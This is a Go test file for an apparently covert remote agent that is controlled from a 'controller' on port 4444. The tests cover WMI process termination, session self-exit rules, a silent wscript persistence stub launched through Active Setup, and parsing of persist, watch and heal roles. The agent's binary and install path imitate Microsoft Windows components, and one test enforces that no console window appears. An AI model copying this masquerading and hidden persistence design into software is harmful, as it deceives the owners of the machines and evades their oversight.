package main

import (
	"strings"
	"testing"
	"time"
)

// wmiTermCmd must name the exact PID, single-call form (v1.46.92: batch
// invokes OOM the provider — 12 errored on a 14-zombie box, singles work).
func TestWmiTermCmd(t *testing.T) {
	got := wmiTermCmd(48584)
	if !strings.Contains(got, "ProcessId=48584") || !strings.Contains(got, "Terminate") {
		t.Fatalf("cmd = %q", got)
	}
	if strings.Contains(got, "485840") || strings.Count(got, "48584") != 1 {
		t.Fatalf("pid must appear exactly once: %q", got)
	}
}

// redundantNoContact is the pileup pact (v1.46.95): a session with zero
// controller contact past grace exits, but ONLY with a live peer. Sole
// agents (offline laptop, dead network) must retry forever.
func TestRedundantNoContact(t *testing.T) {
	now := time.Now()
	start := now.Add(-11 * time.Minute)
	if !redundantNoContact(start, now, false, 2) {
		t.Fatal("old, uncontacted, peers → must fire")
	}
	if redundantNoContact(start, now, true, 2) {
		t.Fatal("contacted → never fire")
	}
	if redundantNoContact(start, now, false, 0) {
		t.Fatal("no peers (sole agent) → never fire")
	}
	if redundantNoContact(now.Add(-time.Minute), now, false, 3) {
		t.Fatal("fresh session → never fire")
	}
	if redundantNoContact(now.Add(-10*time.Minute), now, false, 1) {
		t.Fatal("exactly at grace → never fire (strictly greater)")
	}
	if noContactGrace != 10*time.Minute {
		t.Fatalf("grace drifted: %v", noContactGrace)
	}
}

// watchStubWant must be a wscript one-liner naming the stub beside the exe
// (v1.46.96: Active Setup via powershell.exe flashes a console per update).
func TestWatchStubWant(t *testing.T) {
	got := watchStubWant(`C:\ProgramData\Microsoft\Windows\Update`)
	if !strings.HasPrefix(got, "wscript.exe //B //Nologo") || !strings.HasSuffix(got, `watch-stub.vbs"`) {
		t.Fatalf("stub want = %q", got)
	}
	if strings.Contains(got, "powershell") {
		t.Fatalf("stub want must not mention powershell: %q", got)
	}
}

// agentRole gates reaping: only bare full agents are ever touched.
func TestAgentRole(t *testing.T) {
	for cmd, want := range map[string]string{
		`C:\x\MicrosoftWindowsClient.exe -controller a:4444`: "full",
		`"C:\x\MicrosoftWindowsClient.exe" --watch`:          "watch",
		`agent.exe --svc-heal`:    "svc",
		`agent.exe --wmi-heal`:    "wmi",
		`a.exe -test`:             "test",
		`a.exe -persist`:          "persist",
		`a.exe --WATCH`:           "watch",
		`watchdog.exe -watchful`:  "full",
		``:                        "full",
	} {
		if got := agentRole(cmd); got != want {
			t.Fatalf("role %q = %q want %q", cmd, got, want)
		}
	}
}
